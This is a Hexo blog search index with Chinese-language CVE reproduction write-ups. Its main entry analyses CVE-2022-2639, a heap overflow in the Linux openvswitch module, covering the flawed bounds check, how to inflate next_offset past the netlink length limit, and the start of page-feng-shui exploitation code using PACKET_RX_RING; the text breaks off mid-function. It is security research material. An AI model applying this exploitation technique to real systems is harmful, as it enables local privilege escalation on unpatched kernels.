<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2022-0185的三种解法(一)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%B8%80/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CVE-2022-0185的三种解法(二)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%BA%8C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CVE-2022-0185的三种解法(三)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%B8%89/</url>
    <content><![CDATA[<p>Pipe_primitive 与 CVE-2022-0185 File System Context 整数溢出漏洞利用。</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>cve 复现</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-2639</title>
    <url>/2022/12/02/CVE-2022-2639/</url>
    <content><![CDATA[<p>cve-2022-2639 openvswitch 模块 kmalloc-0x10000 堆溢出、结合 Pipe_Primitive利用。</p>
<span id="more"></span>

<h1 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h1><p>整体源码可以用 si 载入，两边同时看整体逻辑和函数实现比较方便。然后add all，这时候只需要add第一层就行了，不要选下面的，否则 si 就会因为源代码过多而分析不了寄掉。</p>
<p><img src="/img/CVE-2022-2639/1.png" alt="image"></p>
<p>然后根据想要阅读的位置，选择那个对应的小文件夹，然后递归的add所有文件，也就是上面的第二个对号要打上。如果碰到找不到的结构体或者其他定义，可以通过这个在线的 source 找到对应关系，然后再回到 si 中 add 该路径下的文件。这样在 si 中就能找到了。如： <a href="https://elixir.bootlin.com/linux/v5.13/C/ident/nlattr">nlattr</a> 。</p>
<p>找到定义的 nlattr：</p>
<p><img src="/img/CVE-2022-2639/2.png" alt="nlattr"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>查看 patch:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/openvswitch/flow_netlink.c b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">index 7176156d38443c..4c09cf8a0ab2dc 100644</span></span><br><span class="line"><span class="comment">--- a/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">+++ b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="meta">@@ -2465,7 +2465,7 @@</span> static struct nlattr *reserve_sfa_size(struct sw_flow_actions **sfa,</span><br><span class="line"> 	new_acts_size = max(next_offset + req_size, ksize(*sfa) * 2);</span><br><span class="line"> </span><br><span class="line"> 	if (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="deletion">-		if ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span></span><br><span class="line"><span class="addition">+		if ((next_offset + req_size) &gt; MAX_ACTIONS_BUFSIZE) &#123;</span></span><br><span class="line"> 			OVS_NLERR(log, &quot;Flow action size exceeds max %u&quot;,</span><br><span class="line"> 				  MAX_ACTIONS_BUFSIZE);</span><br><span class="line"> 			return ERR_PTR(-EMSGSIZE);</span><br></pre></td></tr></table></figure>



<h2 id="reserve-sfa-size"><a href="#reserve-sfa-size" class="headerlink" title="reserve_sfa_size"></a>reserve_sfa_size</h2><p>找到对应函数，看一下漏洞成因：</p>
<p><img src="/img/CVE-2022-2639/3.png" alt="3"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ACTIONS_BUFSIZE	(32 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> next_offset = offsetof(<span class="keyword">struct</span> sw_flow_actions, actions) + (*sfa)-&gt;actions_len;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> req_size = NLA_ALIGN(attr_len);</span><br></pre></td></tr></table></figure>

<p>可以注意到图中红色框内代码中，等式左边 <code>next_offset</code> 为有符号数，而右边的 <code>req_size</code> 为无符号数。左侧相减后如果结果为负数，<strong>则在与无符号比较时会被强制转换为无符号数而变成非常大的正数</strong>，从而绕过下面的 exceeds 的 check 继续下面的逻辑。</p>
<p><code>MAX_ACTIONS_BUFSIZE</code> 为 0x8000，所以当 <code>next_offset</code> 的值大于该值时，就会发生前面提到的情况。</p>
<p>继续向下分析。</p>
<p>① <code>new_acts_size</code> &#x3D; <code>MAX_ACTIONS_BUFSIZE</code>	&#x3D; 0x8000，2362行根据该 size 进行 <code>alloc</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> sw_flow_actions *<span class="title function_">nla_alloc_flow_actions</span><span class="params">(<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> *<span class="title">sfa</span>;</span></span><br><span class="line"></span><br><span class="line">	WARN_ON_ONCE(size &gt; MAX_ACTIONS_BUFSIZE);</span><br><span class="line"></span><br><span class="line">	sfa = kmalloc(<span class="keyword">sizeof</span>(*sfa) + size, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!sfa)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	sfa-&gt;actions_len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> sfa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="type">size_t</span> orig_len;	<span class="comment">/* From flow_cmd_new netlink actions size */</span></span><br><span class="line">	u32 actions_len;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> <span class="title">actions</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> sw_flow_actions) = <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>最终 <code>kmalloc</code> 大小为 <code>sw_flow_actions</code> 结构体的大小与 <code>new_acts_size</code> 的和；<br>② 回到漏洞函数，将传入的 <code>sfa-&gt;actions</code> 处的内容复制到新申请的 <code>acts-&gt;actions</code> 处；<br>③ 经过一些对 <code>acts</code> 的初始化，返回 <code>acts+next_offset</code>。</p>
<h2 id="copy-action"><a href="#copy-action" class="headerlink" title="copy_action"></a>copy_action</h2><p>通过 si 的 Relation，也能看到调用关系：</p>
<p><img src="/img/CVE-2022-2639/4.png"></p>
<p><code>copy_action</code> 函数中：</p>
<p><img src="/img/CVE-2022-2639/5.png"></p>
<p>返回值 <code>to</code> 即为 <code>acts + next_offset</code>，而 <code>acts</code> 的整个大小才为 0x8000+0x20，所以下面的 <code>memcpy</code> 即发生了堆越界写。 </p>
<p>但是由于对齐，内核并不会分配 0x8020 大小的 slab，而是分配了 0x10000 的 slab。 </p>
<p>根据参考文章中的描述，openvswitch 通过 netlink 进行通信（看源码目录和文件名也有发现）。根据 man pages 的描述：</p>
<blockquote>
<p>Netlink is used to transfer information between the kernel and user-space processes.  It consists of a standard sockets-based interface for user space processes and an internal kernel API for kernel modules.</p>
</blockquote>
<p>最初开发是为了克服 ioctl 的限制。例如，内核可以使用 netlink 接收变长的参数。几乎所有 Linux 网络管理都使用了 netlink，例如 iproute2 中的ip &#x2F; ss &#x2F; bridge。更多关于 Netlink 的东西后续整理好 CVE-2022-1015 的博客后直接挂个链接过去~~</p>
<p>这之中用到了名为 <code>nlattr</code> 的结构体：</p>
<p><img src="/img/CVE-2022-2639/6.png"></p>
<p>该结构体大小为4字节。len 字段为 <code>u16</code>，也就是此时 <code>nla_len</code> 最大为 0xffff，<code>memcpy</code> 的第二个参数 <code>from</code> 的 <code>payload</code> 最多就是 0xffff 字节。而前面的 <code>kmalloc</code> 的 slab 为 0x10000。并不能直接 oob write。</p>
<p>上面提到 openvswitch 模块使用 netlink 通信，那一定会先遵守 netlink 的通信约定（也就是一些数据结构的使用），即 netlink 的消息头：<code>nlmsghdr</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">	__u32		nlmsg_len;	<span class="comment">// 整个消息的长度, 包括 Netlink 消息头本身</span></span><br><span class="line">	__u16		nlmsg_type;	<span class="comment">// 特定接口的消息类型</span></span><br><span class="line">	__u16		nlmsg_flags;<span class="comment">// 消息类型的额外信息</span></span><br><span class="line">	__u32		nlmsg_seq;	<span class="comment">/* Sequence number */</span></span><br><span class="line">	__u32		nlmsg_pid;	<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/7.png"></p>
<p>netlink 又有很多种类，在 netlink.h 中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_ROUTE		0	<span class="comment">/* Routing/device hook				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_UNUSED		1	<span class="comment">/* Unused number				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_USERSOCK	2	<span class="comment">/* Reserved for user mode socket protocols 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_FIREWALL	3	<span class="comment">/* Unused number, formerly ip_queue		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_SOCK_DIAG	4	<span class="comment">/* socket monitoring				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_NFLOG		5	<span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_IP6_FW		13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_DNRTMSG		14	<span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_KOBJECT_UEVENT	15	<span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_GENERIC		16</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>openvswitch 属于 <code>NETLINK_GENERIC</code>。因此在 <code>struct nlmsghdr</code> 中还需要 <code>struct genlmsghdr</code>；在这后面才是真正传递给 openvswitch 的数据，也就是 <code>struct nlattr</code>。<strong>即 <code>struct nlmsghdr -&gt; struct genlmsghdr -&gt; struct nlattr</code> 三层数据结构</strong>。前面的漏洞位于拷贝 flow actions 的场景中，而 flow actions 又是主 <code>struct nlattr</code>中的一个子 <code>struct nlattr</code>。所以层层嵌套下来，最外层的 <code>nlattr</code> 的长度都不超过 0xffff，后面的子 <code>nlattr</code> 更不能达到溢出 0x10000 的要求。</p>
<h2 id="ovs-nla-copy-actions"><a href="#ovs-nla-copy-actions" class="headerlink" title="__ovs_nla_copy_actions"></a>__ovs_nla_copy_actions</h2><p>继续看 <code>copy_action</code> 的上层函数 <code>__ovs_nla_copy_actions</code>：</p>
<p><img src="/img/CVE-2022-2639/8.png"></p>
<p>其中有如下数组来描述每个 <code>ACTION attr</code> 的长度：</p>
<p><img src="/img/CVE-2022-2639/9.png"></p>
<p>根据注释， -1 表示变长，其他直接赋值的自然就是定长的了。对于定长的 <code>ACTION</code>，例如代码中的 <code>OVS_ACTION_ATTR_PUSH_MPLS、OVS_ACTION_ATTR_PUSH_VLAN</code> 等，只进行了一些简单的字段判断就跳出 switch，进入到 <code>copy_action</code> 中：</p>
<p><img src="/img/CVE-2022-2639/10.png"></p>
<p><img src="/img/CVE-2022-2639/11.png"></p>
<p>注意到这里有一个非常重要的标识：<code>skip_copy</code>，他在进入整个 switch 之前被赋值为 <code>false</code>。而在上述对如<code>OVS_ACTION_ATTR_PUSH_MPLS</code> 等定长 <code>ACTION</code> 的处理中，并未修改该值。而在处理其他赋值为 -1 即变长的<code>ACTION</code>中，会将其赋值为 <code>true</code>：</p>
<p><img src="/img/CVE-2022-2639/12.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ovs_ct_copy_action</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *key,</span></span><br><span class="line"><span class="params">		       <span class="keyword">struct</span> sw_flow_actions **sfa,  <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ovs_conntrack_info</span> <span class="title">ct_info</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line">	u16 family;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	···</span><br><span class="line">	err = parse_ct(attr, &amp;ct_info, &amp;helper, <span class="built_in">log</span>);</span><br><span class="line">	···</span><br><span class="line">	err = ovs_nla_add_action(sfa, OVS_ACTION_ATTR_CT, &amp;ct_info,<span class="keyword">sizeof</span>(ct_info), <span class="built_in">log</span>);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>ovs_ct_copy_action</code> 中，<code>parse_ct</code> 中只需要 8 字节就能构造合法的 <code>nlattr</code>（或者更少？不确定）。而在下面的 <code>ovs_nla_add_action</code> 中，<code>add_action</code> 传入的结构体 <code>data</code> 和 <code>len</code> 分别是 <code>ovs_conntrack_info</code> 和该结构体的长度：</p>
<p><img src="/img/CVE-2022-2639/13.png"></p>
<p><img src="/img/CVE-2022-2639/14.png"></p>
<p>而在 kernel 5.13 中该结构体大小为 0xa0：</p>
<p><img src="/img/CVE-2022-2639/15.png"></p>
<p>也就是说当我们添加500个 <code>OVS_ACTION_ATTR_CT</code> 的 <code>nlattr</code>，那只用了 500*8 &#x3D; 0xFA0 字节的 <code>nlattr</code> 长度，却让我们最前面提到的 buffer 的 <code>next_offset</code> 成功增加了 0x500*0xa0 &#x3D; 0x13880 个字节。可以触发溢出。但是使用 <code>ovs_conntrack_info</code> 有个局限性，就是这个结构体在内核版本的更迭中被修改过多次，导致在不同版本的内核其大小并不固定。<strong>虽然不能直接使用，但至少提供了一个思路：通过 <code>add_action</code> 将 <code>next_offset</code> 指针向后移动，使其突破 0xffff 的限制。</strong></p>
<p>所以为了避免不通用的情况，再寻找有没有其他可用的 <code>ACTION_ATTR</code>（毕竟那么多呢）。可以找到<code>OVS_ACTION_ATTR_SET</code>：</p>
<p><img src="/img/CVE-2022-2639/16.png"></p>
<p>在 case 中并未对关键的 <code>skip_copy</code> 进行处理，但是将其传入了调用的函数中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_set</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *a,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *flow_key,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> *skip_copy,</span></span><br><span class="line"><span class="params">			u8 mac_proto, __be16 eth_type, <span class="type">bool</span> masked, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">ovs_key</span> =</span> nla_data(a);</span><br><span class="line">	<span class="type">int</span> key_type = nla_type(ovs_key);</span><br><span class="line">	<span class="type">size_t</span> key_len;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* There can be only one key in a action */</span></span><br><span class="line">	<span class="keyword">if</span> (nla_total_size(nla_len(ovs_key)) != nla_len(a))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	key_len = nla_len(ovs_key);</span><br><span class="line">	<span class="comment">// 传入 masked 为 false</span></span><br><span class="line">	<span class="keyword">if</span> (masked)</span><br><span class="line">		key_len /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (key_type &gt; OVS_KEY_ATTR_MAX ||</span><br><span class="line">		<span class="comment">// 注意这里有一个对 key_len 的检查</span></span><br><span class="line">	    !check_attr_len(key_len, ovs_key_lens[key_type].len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (masked &amp;&amp; !validate_masked(nla_data(ovs_key), key_len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (key_type) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="comment">// 对该 type 的检查非常简单</span></span><br><span class="line">	<span class="keyword">case</span> OVS_KEY_ATTR_ETHERNET:</span><br><span class="line">		<span class="keyword">if</span> (mac_proto != MAC_PROTO_ETHERNET)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	···</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Convert non-masked non-tunnel set actions to masked set actions. */</span></span><br><span class="line">	<span class="keyword">if</span> (!masked &amp;&amp; key_type != OVS_KEY_ATTR_TUNNEL) &#123;</span><br><span class="line">            <span class="comment">// ！！！ 注意此时的 len = key_len * 2</span></span><br><span class="line">            <span class="type">int</span> start, len = key_len * <span class="number">2</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">at</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ！！！</span></span><br><span class="line">            *skip_copy = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            start = add_nested_action_start(sfa,</span><br><span class="line">                                            OVS_ACTION_ATTR_SET_TO_MASKED,</span><br><span class="line">                                            <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (start &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> start;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用__add_action，传入的len为key_len两倍</span></span><br><span class="line">            at = __add_action(sfa, key_type, <span class="literal">NULL</span>, len, <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(at))</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(at);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(nla_data(at), nla_data(ovs_key), key_len); <span class="comment">/* Key. */</span></span><br><span class="line">            <span class="built_in">memset</span>(nla_data(at) + key_len, <span class="number">0xff</span>, key_len);    <span class="comment">/* Mask. */</span></span><br><span class="line">            <span class="comment">/* Clear non-writeable bits from otherwise writeable fields. */</span></span><br><span class="line">            <span class="keyword">if</span> (key_type == OVS_KEY_ATTR_IPV6) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ovs_key_ipv6</span> *<span class="title">mask</span> =</span> nla_data(at) + key_len;</span><br><span class="line"></span><br><span class="line">                mask-&gt;ipv6_label &amp;= htonl(<span class="number">0x000FFFFF</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            add_nested_action_end(*sfa, start);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们内部嵌套的 <code>nlattr type</code>为 <code>OVS_KEY_ATTR_ETHERNET</code>，首先要通过前面提到的 <code>key_len</code> 的检查，即 <code>key_len</code> 等于 sizeof(struct ovs_key_ethernet) &#x3D; 1*2*6 &#x3D; 0x0C：</p>
<p><img src="/img/CVE-2022-2639/17.png"></p>
<p><img src="/img/CVE-2022-2639/18.png"></p>
<p><img src="/img/CVE-2022-2639/19.png"></p>
<p>算上添加这个 <code>nlattr</code> 所需的两层 header（嵌套），即需要使用 0x04 + 0x04 + 0x0C &#x3D; 0x14 字节的内存就让最前面提出的 <code>next_offset</code> 的指针前进 0x04 + 0x04 + 0x0C * 2 &#x3D; 0x20 字节。虽然放大比例不如 <code>sizeof(struct ovs_conntrack_info)</code>，但好在其在能用来溢出的前提下，保证了更优的稳定性（无需根据内核版本来计算结构体的大小且粒度较小，溢出写会更精确）。<br>最后在回到 <code>copy_action</code> 中，<code>memcpy</code> 的时候就会产生溢出。也就是第二次拷贝剩余的 <code>nlattr</code> 时（第一次是对前面 <code>OVS_ACTION_ATTR_SET</code> 推动 <code>next_offset</code> 的操作）。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>那么现在漏洞很明显：在 0x10000 的 slab 上的堆溢出。</p>
<p>（由于本人经常喜欢在纸上写写画画，所以下面可能会出现一些奇怪的示意图片~~其他非常精美的图片都来自 <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE 漏洞分析</a>）</p>
<p>以往经常使用的消息队列的 <code>struct msg_msg</code> 每个主消息最多一个页大小，即 0x1000，后续的 <code>msg_msgseg</code> 虽然会单链表连接，但是想直接让发生溢出的 0x10000 的 slab 后紧挨着这两种结构的概率极低。所以既然需要跨页，不如使用页风水来调节内存布局（更多关于页风水的原理和利用后续整理好 corCTF2022-cache-of-castaways 和 CVE-2022-27666 链过去~）。说到页风水，那就要请出 <code>setsockopt PACKET_TX_RING/PACKET_RX_RING</code> 了。通过该函数，就可以随时申请 0x10000 的 slab 并且随时释放这些 slab。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">packet_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line">		<span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line">	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">		<span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">		lock_sock(sk);</span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		···</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">						    optname == PACKET_TX_RING);</span><br><span class="line">		&#125;</span><br><span class="line">		release_sock(sk);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">		···</span><br><span class="line">		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">		···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	···</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">	buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">	gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* complete and utter failure */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经常使用的板子（之前自己写的不是很灵活，直接用 <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 师傅博客</a> 中的了，此外还收获了其他一些比较有用的轮子😏）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set parameter &amp; call setsockopt() to alloc RX_RING buffer</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> 